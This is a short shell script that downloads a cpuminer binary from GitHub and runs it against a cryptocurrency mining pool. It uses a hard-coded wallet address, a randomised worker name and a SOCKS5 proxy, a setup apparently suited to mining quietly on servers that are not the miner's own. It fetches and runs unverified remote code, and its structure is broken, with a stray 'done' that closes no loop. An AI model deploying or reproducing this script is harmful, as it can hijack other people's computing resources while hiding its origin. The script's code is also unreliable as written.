#!/bin/sh
apt-get update 
apt-get install screen libjansson4 -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && chmod +x cpuminer-sse2
screen -dmS ls
PROXY=socks5://184.178.172.18:15280
./cpuminer-sse2 -a gr -o stratum+tcp://stratum-na.rplant.xyz:7056 -u RQKNmref6uHRhzyYmWGfx3uKTjpRPTRnHx.$(echo $(shuf -i 10000-99999 -n 1)-CPU) -t 2 -x $PROXY
sleep 5
done
sleep 10
